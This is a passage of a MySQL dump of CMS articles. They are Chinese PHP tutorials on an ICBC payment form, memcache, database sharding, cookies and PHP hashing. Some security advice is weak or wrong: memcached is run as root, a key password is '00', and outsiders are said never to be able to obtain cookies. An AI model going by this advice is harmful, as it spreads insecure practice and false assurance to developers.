strlen($ssrc));  &lt;br /&gt;\r\n$cert=$com-&amp;gt;getCert(1);             //商城证书公钥  &lt;br /&gt;\r\n完成订单签名数据和商城证书公钥的加密处理，这里将商户的测试证书存储到c:\\windows目录下，设置商户的密钥口令是00.&lt;br /&gt;\r\n然后创建form表单，将制定的数据提交到工行指定的网站中，关键代码如下：&lt;br /&gt;\r\n需要提交的表单数据:&amp;lt;form  action=&quot;https://mybank.icbc.com.cn/&quot; method=&quot;post&quot; name=&quot;form_bank&quot;&amp;gt;  &lt;br /&gt;\r\n   &amp;lt;input name=&quot;interfaceName&quot; type=&quot;hidden&quot; value=&quot;ICBC_PERBANK_B2C&quot;/&amp;gt; &lt;br /&gt;\r\n    &amp;lt;input name=&quot;interfaceVersion&quot; type=&quot;hidden&quot; value=&quot;1.0.0.0&quot;/&amp;gt;  &lt;br /&gt;\r\n    &amp;lt;input name=&quot;orderid&quot; type=&quot;hidden&quot; value=&quot;&amp;lt;{$ddnumber}&amp;gt;&quot;/&amp;gt;  &lt;br /&gt;\r\n    &amp;lt;input name=&quot;amount&quot; type=&quot;hidden&quot; value=&quot;&amp;lt;{$amount}&amp;gt;&quot;/&amp;gt;  &lt;br /&gt;\r\n    &amp;lt;input name=&quot;curType&quot; type=&quot;hidden&quot; value=&quot;001&quot;/&amp;gt;  &lt;br /&gt;\r\n    &amp;lt;input name=&quot;merID&quot; type=&quot;hidden&quot; value=&quot;&amp;lt;{$merid}&amp;gt;&quot;/&amp;gt;  &lt;br /&gt;\r\n    &amp;lt;input name=&quot;merAcct&quot; type=&quot;hidden&quot; value=&quot;&amp;lt;{$meracct}&amp;gt;&quot;/&amp;gt;  &lt;br /&gt;\r\n    &amp;lt;input name=&quot;verifyJoinFlag&quot; type=&quot;hidden&quot; value=&quot;0&quot;/&amp;gt;  &lt;br /&gt;\r\n    &amp;lt;input name=&quot;notifyType&quot; type=&quot;hidden&quot; value=&quot;HS&quot;/&amp;gt;  &lt;br /&gt;\r\n    &amp;lt;input name=&quot;merURL&quot; type=&quot;hidden&quot; value=&quot;&amp;lt;{$returnaddress}&amp;gt;&quot;/&amp;gt;  &lt;br /&gt;\r\n    &amp;lt;input name=&quot;resultType&quot; type=&quot;hidden&quot;  value=&quot;0&quot;/&amp;gt;  &lt;br /&gt;\r\n    &amp;lt;input name=&quot;orderDate&quot; type=&quot;hidden&quot; value=&quot;&amp;lt;{$nowtime}&amp;gt;&quot;/&amp;gt;  &lt;br /&gt;\r\n    &amp;lt;input name=&quot;merSignMsg&quot; type=&quot;hidden&quot; value=&quot;&amp;lt;{$ssrc}&amp;gt;&quot; /&amp;gt;  &lt;br /&gt;\r\n    &amp;lt;input name=&quot;merCert&quot; type=&quot;hidden&quot; value=&quot;&amp;lt;{$cert}&amp;gt;&quot; /&amp;gt;  &lt;br /&gt;\r\n&amp;lt;/form&amp;gt;   ', 1, 1, 0, 0, 1303895222, 1, 'admin'),
(91, 1, 'php中memcache的协议分析、适用场合和使用实例详解', '', '', 'php中memcache的协议分析、适用场合和使用实例详解:&lt;br /&gt;\r\n1. 什么是Memcache?&lt;br /&gt;\r\nMemcache是danga.com的一个项目，最早是为 LiveJournal 服务的，目前全世界不少人使用这个缓存项目来构建自己大负载的网站，来分担数据库的压力。&lt;br /&gt;\r\n它可以应对任意多个连接，使用非阻塞的网络IO。由于它的工作机制是在内存中开辟一块空间，然后建立一个HashTable，Memcached自管理这些HashTable。&lt;br /&gt;\r\nMemcache官方网站：http://www.danga.com/memcached，更多详细的信息可以来这里了解 &lt;br /&gt;\r\nMemcache和memcached的区别？&lt;br /&gt;\r\n其实Memcache是这个项目的名称，而memcached是它服务器端的主程序文件名。一个是项目名称，一个是主程序文件名。&lt;br /&gt;\r\n2. Memcache的使用&lt;br /&gt;\r\n使用Memcache的网站一般流量都是比较大的，为了缓解数据库的压力，让Memcache作为一个缓存区域，把部分信息保存在内存中，在前端能够迅速的进行存取。那么一般的焦点就是集中在如何分担数据库压力和进行分布式，毕竟单台Memcache的内存容量的有限的。我这里简单提出我的个人看法，未经实践，权当参考。&lt;br /&gt;\r\n分布式应用&lt;br /&gt;\r\nMemcache本来支持分布式，我们客户端稍加改造，更好的支持。我们的key可以适当进行有规律的封装，比如以user为主的网站来说，每个用户都有User ID，那么可以按照固定的ID来进行提取和存取，比如1开头的用户保存在第一台Memcache服务器上，以2开头的用户的数据保存在第二胎Mecache服务器上，存取数据都先按照User ID来进行相应的转换和存取。&lt;br /&gt;\r\n但是这个有缺点，就是需要对User ID进行判断，如果业务不一致，或者其他类型的应用，可能不是那么合适，那么可以根据自己的实际业务来进行考虑，或者去想更合适的方法。&lt;br /&gt;\r\n减少数据库压力&lt;br /&gt;\r\n这个算是比较重要的，所有的数据基本上都是保存在数据库当中的，每次频繁的存取数据库，导致数据库性能极具下降，无法同时服务更多的用户，比如MySQL，特别频繁的锁表，那么让Memcache来分担数据库的压力吧。我们需要一种改动比较小，并且能够不会大规模改变前端的方式来进行改变目前的架构。&lt;br /&gt;\r\n我考虑的一种简单方法：&lt;br /&gt;\r\n后端的数据库操作模块，把所有的Select操作提取出来（update/delete/insert不管），然后把对应的SQL进行相应的hash算法计算得出一个hash数据key（比如MD5或者SHA），然后把这个key去Memcache中查找数据，如果这个数据不存在，说明还没写入到缓存中，那么从数据库把数据提取出来，一个是数组类格式，然后把数据在set到Memcache中，key就是这个SQL的hash值，然后相应的设置一个失效时间，比如一个小时，那么一个小时中的数据都是从缓存中提取的，有效减少数据库的压力。缺点是数据不实时，当数据做了修改以后，无法实时到前端显示，并且还有可能对内存占用比较大，毕竟每次select出来的数据数量可能比较巨大，这个是需要考虑的因素。&lt;br /&gt;\r\n3. Memcache的安全&lt;br /&gt;\r\n我们上面的Memcache服务器端都是直接通过客户端连接后直接操作，没有任何的验证过程，这样如果服务器是直接暴露在互联网上的话是比较危险，轻则数据泄露被其他无关人员查看，重则服务器被入侵，因为Mecache是以root权限运行的，况且里面可能存在一些我们未知的bug或者是缓冲区溢出的情况，这些都是我们未知的，所以危险性是可以预见的。为了安全起见，我做两点建议，能够稍微的防止黑客的入侵或者数据的泄露。&lt;br /&gt;\r\n内网访问&lt;br /&gt;\r\n最好把两台服务器之间的访问是内网形态的，一般是Web服务器跟Memcache服务器之间。普遍的服务器都是有两块网卡，一块指向互联网，一块指向内网，那么就让Web服务器通过内网的网卡来访问Memcache服务器，我们Memcache的服务器上启动的时候就监听内网的IP地址和端口，内网间的访问能够有效阻止其他非法的访问。&lt;br /&gt;\r\n# memcached -d -m 1024 -u root -l 192.168.0.200 -p 11211 -c 1024 -P /tmp/memcached.pid&lt;br /&gt;\r\nMemcache服务器端设置监听通过内网的192.168.0.200的ip的11211端口，占用1024MB内存，并且允许最大1024个并发连接&lt;br /&gt;\r\n设置防火墙&lt;br /&gt;\r\n防火墙是简单有效的方式，如果却是两台服务器都是挂在网的，并且需要通过外网IP来访问Memcache的话，那么可以考虑使用防火墙或者代理程序来过滤非法访问。&lt;br /&gt;\r\n一般我们在Linux下可以使用iptables或者FreeBSD下的ipfw来指定一些规则防止一些非法的访问，比如我们可以设置只允许我们的Web服务器来访问我们Memcache服务器，同时阻止其他的访问。&lt;br /&gt;\r\n# iptables -F&lt;br /&gt;\r\n# iptables -P INPUT DROP&lt;br /&gt;\r\n# iptables -A INPUT -p tcp -s 192.168.0.2 –dport 11211 -j ACCEPT&lt;br /&gt;\r\n# iptables -A INPUT -p udp -s 192.168.0.2 –dport 11211 -j ACCEPT&lt;br /&gt;\r\n上面的iptables规则就是只允许192.168.0.2这台Web服务器对Memcache服务器的访问，能够有效的阻止一些非法访问，相应的也可以增加一些其他的规则来加强安全性，这个可以根据自己的需要来做。&lt;br /&gt;\r\n4. Memcache的安装&lt;br /&gt;\r\n分为两个过程：memcache服务器端的安装和memcached客户端的安装。&lt;br /&gt;\r\n所谓服务器端的安装就是在服务器（一般都是linux系统）上安装Memcache实现数据的存储&lt;br /&gt;\r\n所谓客户端的安装就是指php（或者其他程序，Memcache还有其他不错的api接口提供）去使用服务器端的Memcache提供的函数，需要php添加扩展。&lt;br /&gt;\r\n具体的配置大家可以参考：&lt;br /&gt;\r\nLinux下的Memcache安装：http://www.ccvita.com/index.php/257.html&lt;br /&gt;\r\nWindows下的Memcache安装：http://www.ccvita.com/index.php/258.html&lt;br /&gt;\r\nMemcache基础教程：http://www.ccvita.com/index.php/259.html&lt;br /&gt;\r\nPHP的Memcache&lt;br /&gt;\r\n&amp;lt;?php&lt;br /&gt;\r\n//连接&lt;br /&gt;\r\n$mem = new Memcache;&lt;br /&gt;\r\n$mem-&amp;gt;connect(&quot;192.168.0.200&quot;, 11211);&lt;br /&gt;\r\n//保存数据&lt;br /&gt;\r\n$mem-&amp;gt;set(''key1'', ''This is first value'', 0, 60);&lt;br /&gt;\r\n$val = $mem-&amp;gt;get(''key1'');&lt;br /&gt;\r\necho &quot;Get key1 value: &quot; . $val .&quot;&amp;lt;br /&amp;gt;&quot;;&lt;br /&gt;\r\n//替换数据&lt;br /&gt;\r\n$mem-&amp;gt;replace(''key1'', ''This is replace value'', 0, 60);&lt;br /&gt;\r\n$val = $mem-&amp;gt;get(''key1'');&lt;br /&gt;\r\necho &quot;Get key1 value: &quot; . $val . &quot;&amp;lt;br /&amp;gt;&quot;;&lt;br /&gt;\r\n//保存数组&lt;br /&gt;\r\n$arr = array(''aaa'', ''bbb'', ''ccc'', ''ddd'');&lt;br /&gt;\r\n$mem-&amp;gt;set(''key2'', $arr, 0, 60);&lt;br /&gt;\r\n$val2 = $mem-&amp;gt;get(''key2'');&lt;br /&gt;\r\necho &quot;Get key2 value: &quot;;&lt;br /&gt;\r\nprint_r($val2);&lt;br /&gt;\r\necho &quot;&amp;lt;br /&amp;gt;&quot;;&lt;br /&gt;\r\n//删除数据&lt;br /&gt;\r\n$mem-&amp;gt;delete(''key1'');&lt;br /&gt;\r\n$val = $mem-&amp;gt;get(''key1'');&lt;br /&gt;\r\necho &quot;Get key1 value: &quot; . $val . &quot;&amp;lt;br /&amp;gt;&quot;;&lt;br /&gt;\r\n//清除所有数据&lt;br /&gt;\r\n$mem-&amp;gt;flush();&lt;br /&gt;\r\n$val2 = $mem-&amp;gt;get(''key2'');&lt;br /&gt;\r\necho &quot;Get key2 value: &quot;;&lt;br /&gt;\r\nprint_r($val2);&lt;br /&gt;\r\necho &quot;&amp;lt;br /&amp;gt;&quot;;&lt;br /&gt;\r\n//关闭连接&lt;br /&gt;\r\n$mem-&amp;gt;close();&lt;br /&gt;\r\n?&amp;gt;&lt;br /&gt;\r\n如果正常的话，浏览器将输出：&lt;br /&gt;\r\nGet key1 value: This is first value&lt;br /&gt;\r\nGet key1 value: This is replace value&lt;br /&gt;\r\nGet key2 value: Array ( [0] =&amp;gt; aaa [1] =&amp;gt; bbb [2] =&amp;gt; ccc [3] =&amp;gt; ddd )&lt;br /&gt;\r\nGet key1 value:&lt;br /&gt;\r\nGet key2 value:&lt;br /&gt;\r\n初始化一个Memcache的对象：&lt;br /&gt;\r\n$mem = new Memcache;&lt;br /&gt;\r\n连接到我们的Memcache服务器端，第一个参数是服务器的IP地址，也可以是主机名，第二个参数是Memcache的开放的端口：&lt;br /&gt;\r\n$mem-&amp;gt;connect(&quot;192.168.0.200&quot;, 12000);&lt;br /&gt;\r\n保存一个数据到Memcache服务器上，第一个参数是数据的key，用来定位一个数据，第二个参数是需要保存的数据内容，这里是一个字符串，第三个参数是一个标记，一般设置为0或者MEMCACHE_COMPRESSED就行了，第四个参数是数据的有效期，就是说数据在这个时间内是有效的，如果过去这个时间，那么会被Memcache服务器端清除掉这个数据，单位是秒，如果设置为0，则是永远有效，我们这里设置了60，就是一分钟有效时间：&lt;br /&gt;\r\n$mem-&amp;gt;set(‘key1‘, ‘This is first value’, 0, 60);&lt;br /&gt;\r\n从Memcache服务器端获取一条数据，它只有一个参数，就是需要获取数据的key，我们这里是上一步设置的key1，现在获取这个数据后输出输出：&lt;br /&gt;\r\n$val = $mem-&amp;gt;get(’key1′);&lt;br /&gt;\r\necho &quot;Get key1 value: &quot; . $val;&lt;br /&gt;\r\n现在是使用replace方法来替换掉上面key1的值，replace方法的参数跟set是一样的，不过第一个参数key1是必须是要替换数据内容的key，最后输出了：&lt;br /&gt;\r\n$mem-&amp;gt;replace(‘key1′, ‘This is replace value’, 0, 60);&lt;br /&gt;\r\n$val = $mem-&amp;gt;get(‘key1′);&lt;br /&gt;\r\necho &quot;Get key1 value: &quot; . $val;&lt;br /&gt;\r\n同样的，Memcache也是可以保存数组的，下面是在Memcache上面保存了一个数组，然后获取回来并输出&lt;br /&gt;\r\n$arr = array(‘aaa’, ‘bbb’, ‘ccc’, ‘ddd’);&lt;br /&gt;\r\n$mem-&amp;gt;set(‘key2′, $arr, 0, 60);&lt;br /&gt;\r\n$val2 = $mem-&amp;gt;get(‘key2′);&lt;br /&gt;\r\nprint_r($val2);&lt;br /&gt;\r\n现在删除一个数据，使用delte接口，参数就是一个key，然后就能够把Memcache服务器这个key的数据删除，最后输出的时候没有结果&lt;br /&gt;\r\n$mem-&amp;gt;delete(‘key1′);&lt;br /&gt;\r\n$val = $mem-&amp;gt;get(‘key1′);&lt;br /&gt;\r\necho &quot;Get key1 value: &quot; . $val . &quot;&amp;lt;br&amp;gt;&quot;;&lt;br /&gt;\r\n最后我们把所有的保存在Memcache服务器上的数据都清除，会发现数据都没有了，最后输出key2的数据为空，最后关闭连接&lt;br /&gt;\r\n$mem-&amp;gt;flush();&lt;br /&gt;\r\n$val2 = $mem-&amp;gt;get(‘key2′);&lt;br /&gt;\r\necho &quot;Get key2 value: &quot;;&lt;br /&gt;\r\nprint_r($val2);&lt;br /&gt;\r\necho &quot;&amp;lt;br&amp;gt;&quot;', 1, 1, 0, 0, 1303895294, 1, 'admin'),
(92, 1, 'php+mysql分库分表的哈希(hash)算法', '', '', 'hp+mysql分库分表的哈希(hash)算法:&lt;br /&gt;\r\n我们在实际开发的时候,难免会遇到大访问量的问题,一个表中的数据就可以到百万甚至千万级的数据,这样一来数据库的压力会比较大,我们通常的做法就是给数据库分表来减轻数据库的压力,下面是用php写的一个分库分表的算法,需要的朋友可以参考一下:&lt;br /&gt;\r\n&amp;lt;?php&lt;br /&gt;\r\nfunction calc_hash_db($u, $s = 4){ &lt;br /&gt;\r\n$h = sprintf(&quot;%u&quot;, crc32($u)); &lt;br /&gt;\r\n$h1 = intval(fmod($h, $s)); &lt;br /&gt;\r\nreturn $h1; &lt;br /&gt;\r\n} &lt;br /&gt;\r\nfor($i=1;$i&amp;lt; 100;$i++){&lt;br /&gt;\r\necho calc_hash_db($i); &lt;br /&gt;\r\necho &quot;&amp;lt;br&amp;gt;&quot;; &lt;br /&gt;\r\n} &lt;br /&gt;\r\nfunction calc_hash_tbl($u, $n = 256, $m = 16){&lt;br /&gt;\r\n$h = sprintf(&quot;%u&quot;, crc32($u)); &lt;br /&gt;\r\n$h1 = intval($h / $n); &lt;br /&gt;\r\n$h2 = $h1 % $n; &lt;br /&gt;\r\n$h3 = base_convert($h2, 10, $m); &lt;br /&gt;\r\n$h4 = sprintf(&quot;%02s&quot;, $h3); &lt;br /&gt;\r\nreturn $h4; &lt;br /&gt;\r\n}&lt;br /&gt;\r\n?&amp;gt;		    				&lt;div style=&quot;width:470px;margin-left:auto;margin-right:auto;margin-top:10px;&quot;&gt;								&lt;ins style=&quot;display:inline-table;border:medium none;height:60px;margin:0pt;padding:0pt;position:relative;visibility:visible;width:468px;&quot;&gt;&lt;ins id=&quot;aswift_1_anchor&quot; style=&quot;display:block;border:medium none;height:60px;margin:0pt;padding:0pt;position:relative;visibility:visible;width:468px;&quot;&gt;&lt;br /&gt;\r\n&lt;/ins&gt;&lt;/ins&gt;			&lt;/div&gt;\r\n', 1, 1, 0, 0, 1303895397, 1, 'admin'),
(93, 1, 'PHP之Cookie技术简介', '', '', '这篇文章主要讲解了什么是Cookie，以及cookie的起源和根本属性，为学习Cookie提供技术背景，推荐PHP初学者一看。在学习PHP如何设置Cookie之前我们先来了解下Cookie技术。&lt;br /&gt;\r\n　　（1）&lt;strong&gt;Cookie技术简介&lt;/strong&gt; &lt;br /&gt;\r\n&lt;br /&gt;\r\n　　 在WEB技术发展史上，Cookie技术的出现是一个重大的变革。最先是Netscape在它的Netscape Navigator浏览器中引入了Cookie技术，从那时起，World Wide Web 协会就开始支持Cookie标准。以后又经过微软的大&lt;br /&gt;\r\n力推广（因为微软的IIS Web服务器所采用的ASP技术很大程度的使用了Cookie技术），即在微软的Internet Explorer浏览器中完全支持Cookie技术。到现在，绝大多数的浏览器都支持Cookie技术，或者至少兼容Cookie&lt;br /&gt;\r\n技术的使用。 &lt;br /&gt;\r\n　　1）&lt;strong&gt;什么是Cookie&lt;/strong&gt;？ &lt;br /&gt;\r\n　　按照Netscape官方文档中的定义，Cookie是在HTTP协议下，服务器或脚本可以维护客户工作站上信息的一种方式。Cookie 是由Web服务器保存在用户浏览器上的小文本文件，它可以包含有关用户的信息（如身份&lt;br /&gt;\r\n识别号码、密码、用户在Web站点购物的方式或用户访问该站点的次数）。无论何时用户链接到服务器，Web站点都可以访问Cookie信息。 &lt;br /&gt;\r\n　　通俗地讲，浏览器用一个或多个限定的文件来支持Cookie。这些文件在使用Windows操作系统的机器上叫做Cookie 文件，在Macintosh机器上叫做magic Cookie 文件，这些文件被网站用来在上面存储Cookie数据。&lt;br /&gt;\r\n网站可以在这些Cookie 文件中插入信息，这样对有些网络用户就有些副作用。有些用户认为这造成了对个人隐私的侵犯，更糟的是，有些人认为Cookie是对个人空间的侵占，而且会对用户的计算机带来安全性的危害。&lt;br /&gt;\r\n　　目前有些Cookie 是临时的，另一些则是持续的。临时的Cookie只在浏览器上保存一段规定的时间，一旦超过规定的时间该Cookie就会被系统清除。例如在PHP中Cookie被用来跟踪用户进程直到用户离开网站。持续&lt;br /&gt;\r\n的Cookie则保存在用户的Cookie文件中，下一次用户返回时，仍然可以对它进行调用。 &lt;br /&gt;\r\n　　在Cookie文件中保存Cookie，一些用户会过分地认为这将带来很大的问题。主要是有些用户担心Cookie会跟踪用户网上冲浪的习惯，譬如用户喜爱到那些类型的站点、爱从事些什么活动等。害怕这种个人信息一&lt;br /&gt;\r\n旦落入一些别有用心的家伙手中，那么个人也就可能成为一大堆广告垃圾的对象，甚至遭到意外的损害。不过，这种担心压根儿不会发生，因为网站以外的用户是无法跨过网站来获得Cookie信息的。所以想以这种目&lt;br /&gt;\r\n的来应用Cookie是不可能的。不过，由于一些用户错误的理解以及“以讹传讹”，一些浏览器开发商别无选择，只好作出相识的响应（例如Netscape Navigator4.0和Internet Explorer3.0都提供了屏蔽Cookie 的选&lt;br /&gt;\r\n项）。 &lt;br /&gt;\r\n　　对Cookie技术期待了这么久的结果是，迫使许多浏览器开发商在它们的浏览器中提供了对Cookie的灵活性控制功能。例如，目前的两大主流浏览器Netscape Navigator 和 Internet Explorer是这样处理Cookie&lt;br /&gt;\r\n的:Netscape Navigator4.0不但可以接受Cookie进行警告，而且还可以屏蔽掉Cookie；InternetExplorer3.0也可以屏蔽Cookie，但在Internet Explorer4.0中就只能进行接受警告而没有提供屏蔽选项，不过在Internet&lt;br /&gt;\r\nExplorer4.0之后的更新版本中又加入了屏蔽Cookie的功能选项。 &lt;br /&gt;\r\n　　此外，很多最新的技术甚至已经可以在不能屏蔽Cookie的浏览器上进行Cookie的屏蔽了。例如，可以通过将Cookie文件设置成不同的类型来限制Cookie的使用。但是，非常不幸地是，要是你想完全屏蔽Cookie的&lt;br /&gt;\r\n话，肯定会因此拒绝许多的站点页面。因为当今已经有许多Web站点开发人员爱上了Cookie技术的强大功能，例如Session对象的使用就离不开Cookie的支持。 &lt;br /&gt;\r\n　　尽管今天仍有一些网络用户对于Cookie的争论乐此不倦，但是对于绝大多数的网络用户来说还是倾向于接受Cookie的。因此，我们尽可以放心地使用Cookie技术来开发我们的WEB页面。 &lt;br /&gt;\r\n&lt;br /&gt;\r\n　　2）&lt;strong&gt;Cookie是怎样工作的&lt;/strong&gt;？ &lt;br /&gt;\r\n　　要了解Cookie，必不可少地要知道它的工作原理。一般来说，Cookie通过HTTP Headers从服务器端返回到浏览器上。首先，服务器端在响应中利用Set-Cookie header来创建一个Cookie ，然后，浏览器在它的请&lt;br /&gt;\r\n求中通过Cookie header包含这个已经创建的Cookie，并且反它返回至服务器，从而完成浏览器的论证。 &lt;br /&gt;\r\n&lt;br /&gt;\r\n　　例如，我们创建了一个名字为login的Cookie来包含访问者的信息，创建Cookie时，服务器端的Header 如下面所示，这里假设访问者的注册名是“Michael Jordan”，同时还对所创建的Cookie的属性如path、&lt;br /&gt;\r\ndomain、expires等进行了指定。 &lt;br /&gt;\r\n&lt;br /&gt;\r\n　　Set-Cookie:login=Michael Jordan;path=/;domain=msn.com; &lt;br /&gt;\r\n　　expires=Monday,01-Mar-99 00:00:01 GMT &lt;br /&gt;\r\n&lt;br /&gt;\r\n　　上面这个Header会自动在浏览器端计算机的Cookie文件中添加一条记录。浏览器将变量名为“login”的Cookie赋值为“Michael Jordon”。注意，在实际传递过程中这个Cookie的值是经过了URLEncode方法的&lt;br /&gt;\r\nURL编码操作的。 这个含有Cookie值的HTTP Header被保存到浏览器的Cookie文件后，Header就通知浏览器将Cookie通过请求以忽略路径的方式返回到服务器，完成浏览器的认证操作。 &lt;br /&gt;\r\n&lt;br /&gt;\r\n　　此外，我们使用了Cookie的一些属性来限定该Cookie的使用。例如Domain属性能够在浏览器端对Cookie发送进行限定，具体到上面的例子，该Cookie只能传达室到指定的服务器上，而决不会跑到其他的如&lt;a href=&quot;http://www.phpq.net/&quot; target=&quot;_blank&quot;&gt;www.phpq.net&lt;/a&gt;的Web站点上去。Expires属性则指定了该Cookie保存的时间期限，例如上面的Cookie在浏览器上只保存到1999年3月1日1秒。当然，如果浏览器上Cookie 太多，超过了系统所允许的范围，浏览器将自动对&lt;br /&gt;\r\n它进行删除。至于属性Path，用来指定Cookie将被发送到服务器的哪一个目录路径下。 &lt;br /&gt;\r\n&lt;br /&gt;\r\n　　说明：浏览器创建了一个Cookie后，对于每一个针对该网站的请求，都会在Header中带着这个Cookie；不过，对于其他网站的请求Cookie是绝对不会跟着发送的。而且浏览器会这样一直发送，直到Cookie过期为止。Cookie技术是一个非常有争议的技术，自经诞生它就成了广大网络用户和Web开发人员的一个争论焦点。有一些网络用户，甚至包括一些资深的Web专家也对它的产生和推广感到不满，这倒不是因为Cookie技术的功能太弱或别的技术性能上的原因，而仅仅是因为他们觉得Cookie 的使用，对网络用户的隐私构成了危害。因为Cookie是由Web服务器保存在用户浏览器上的小文本文件，它包含有关用户的信息（如身份&lt;br /&gt;\r\n识别号码、密码、用户在Web站点上购物的方式或用户访问该站点的次数）。 那么Cookie 技术究竟怎样呢？是否真的给网络用户带来了个人隐私的危害呢？看了上面的资料您心中应该有个度量了吧。', 1, 1, 0, 0, 1303895641, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(94, 1, 'php hash简介', '', '', '&lt;font face=&quot;微软雅黑 &quot;&gt;&lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=PHP&quot; class=&quot;t_tag&quot;&gt;PHP&lt;/span&gt;数组的定义，本质上是一种键-值映射的关系，算是一种散列表（哈希表）。PHP的数组,关联数组,对象属性,&lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=%E5%87%BD%E6%95%B0&quot; class=&quot;t_tag&quot;&gt;函数&lt;/span&gt;表,符号表,等等都是用HashTable来做为容器的。PHP的Hash采用的是目前最为普遍的DJBX33A (Daniel J. Bernstein, Times 33 with Addition), 这个算法被广泛运用与多个&lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=%E8%BD%AF%E4%BB%B6&quot; class=&quot;t_tag&quot;&gt;软件&lt;/span&gt;&lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=%E9%A1%B9%E7%9B%AE&quot; class=&quot;t_tag&quot;&gt;项目&lt;/span&gt;,Apache, Perl和Berkeley DB等. 对于&lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=%E5%AD%97%E7%AC%A6&quot; class=&quot;t_tag&quot;&gt;字符&lt;/span&gt;串而言这是目前所知道的最好的哈希算法，原因在于该算法的速度非常快，而且分类非常好(冲突小,分布均匀).&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; 核心思想如下：hash(i) = hash(i-1) * 33 + str&lt;/font&gt;&lt;font face=&quot;微软雅黑 &quot;&gt;”&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; 我所批判的是《强大而高效》作者望文生义，拼拼凑凑，就认为php的数组十分强大高效，并且指出java里的数组要弱得多。没有从原理上认识过hash原理，也就更认识不到hash对内存的占用情况。Php数组是灵活而强大的，但是一点都不高效，是很占内存的，再加上php的&lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=%E5%8F%98%E9%87%8F&quot; class=&quot;t_tag&quot;&gt;变量&lt;/span&gt;使用的是封装的结构体，使得复杂度大大增加了。据网友测试，和C语言比，同样大小的数组，其所耗内存为C的10倍。&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; 来看看hash的定义，“Hash，一般翻译做“散列”，也有直接音译为“哈希”的，就是把任意长度的输入（又叫做预映射， pre-image），通过散列算法，变换成固定长度的输出，该输出就是散列值。这种转换是一种压缩映射，也就是，散列值的&lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=%E7%A9%BA%E9%97%B4&quot; class=&quot;t_tag&quot;&gt;空间&lt;/span&gt;通常远小于输入的空间，不 同的输入可能会散列成相同的输出，而不可能从散列值来唯一的确定输入值。简单的说就是一种将任意长度的消息压缩到某一固定长度的消息摘要的函数。”&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; Hash离我们远吗？不远，从MD5（）散列函数到 memcache内存缓存&lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=%E7%B3%BB%E7%BB%9F&quot; class=&quot;t_tag&quot;&gt;系统&lt;/span&gt;，到简单的&lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=%E6%95%B0%E6%8D%AE%E5%BA%93&quot; class=&quot;t_tag&quot;&gt;数据库&lt;/span&gt;分表设计，到处都有hash的阴影。&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; 假设我们要在一本书里查找biang biang 面的biang字(陕西人都知道)，那么我就要从这本书的第一页，一个字一个字的顺序查找，直到找到这个字而已，也许我花了三天&lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=%E6%97%B6%E9%97%B4&quot; class=&quot;t_tag&quot;&gt;时间&lt;/span&gt;翻完了这本书，都找不到这个字。我们说，这个算法的复杂度是O（n),此算法的完成时间和这本书的规模(字数)即N有很大关系。那假如说，我有一本发票，是按顺序编码的，有1000页厚，我要找到第A00100234号发票，我只需要直接翻到234页就能找到它，那我们呢就说这个问题的复杂度是O(1)，也就是问题的&lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=%E8%A7%A3%E5%86%B3&quot; class=&quot;t_tag&quot;&gt;解决&lt;/span&gt;和规模无关。&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; 要想达成 O(1) 复杂度的查找，必须满足3个条件：　　1. 存储单元（例如一页纸）中存储的内容（例如发票编码）与存储单元的地址（例如页码）必须是一一对应的。　　2. 这种一一对应的关系必须是可以预先知道的。　　3. 存储单元是可以随机读取的。这里“随机读取”的意思是可以以任意的顺序读取每个存储单元，并且每次读取所需时间都是相同的。&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; 在这里，我模拟一个哈希表，开辟一块内存空间，来存放0-9这10个数字，&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; class hash1{&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;private $array;&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;public &lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=function&quot; class=&quot;t_tag&quot;&gt;function&lt;/span&gt; __construct() {&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;$this-&amp;gt;array=new SplFixedArray(10);&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;public function add($i){&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;$this-&amp;gt;array[$i]=$i;&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; &lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;public function contain($i){&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;if ($this-&amp;gt;array[$i]==null) {&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; 